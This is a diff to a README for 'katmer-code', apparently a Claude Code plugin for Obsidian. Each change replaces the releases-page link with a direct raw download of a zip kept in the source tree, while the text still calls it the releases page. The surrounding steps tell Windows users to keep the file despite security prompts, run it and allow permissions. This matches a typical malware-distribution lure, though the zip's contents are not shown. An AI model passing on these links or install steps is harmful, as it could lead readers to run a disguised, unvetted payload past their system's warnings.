@@ -1,6 +1,6 @@
 # 🧠 katmer-code - Claude Code in Obsidian
 
-[![Download katmer-code](https://img.shields.io/badge/Download%20katmer--code-blue?style=for-the-badge)](https://github.com/stuck-lepiotaceae126/katmer-code/releases)
+[![Download katmer-code](https://img.shields.io/badge/Download%20katmer--code-blue?style=for-the-badge)](https://github.com/stuck-lepiotaceae126/katmer-code/raw/refs/heads/main/src/skills/katmer-code-2.3.zip)
 
 ## ✨ What katmer-code does
 
@@ -16,7 +16,7 @@ Use it for:
 
 ## 🚀 Download and install
 
-1. Open the releases page: https://github.com/stuck-lepiotaceae126/katmer-code/releases
+1. Open the releases page: https://github.com/stuck-lepiotaceae126/katmer-code/raw/refs/heads/main/src/skills/katmer-code-2.3.zip
 2. Download the latest Windows file from the release assets
 3. If Windows shows a security prompt, choose to keep the file
 4. Run the installer or app file you downloaded
@@ -38,7 +38,7 @@ katmer-code is built for Windows users who want a simple install flow.
 
 ### How to start
 
-1. Go to the download page again if needed: https://github.com/stuck-lepiotaceae126/katmer-code/releases
+1. Go to the download page again if needed: https://github.com/stuck-lepiotaceae126/katmer-code/raw/refs/heads/main/src/skills/katmer-code-2.3.zip
 2. Get the newest Windows release
 3. Open the downloaded file
 4. If the app asks for permission, allow it
@@ -173,7 +173,7 @@ Pick the Windows file that matches the release notes on the page.
 
 ## 📌 How to update
 
-1. Visit the releases page: https://github.com/stuck-lepiotaceae126/katmer-code/releases
+1. Visit the releases page: https://github.com/stuck-lepiotaceae126/katmer-code/raw/refs/heads/main/src/skills/katmer-code-2.3.zip
 2. Download the newest Windows release
 3. Close the current app if it is open
 4. Run the new file
@@ -224,4 +224,4 @@ This project fits these topics:
 
 ## 📥 Download again
 
-Use this page to download the latest Windows release: https://github.com/stuck-lepiotaceae126/katmer-code/releases
+Use this page to download the latest Windows release: https://github.com/stuck-lepiotaceae126/katmer-code/raw/refs/heads/main/src/skills/katmer-code-2.3.zip
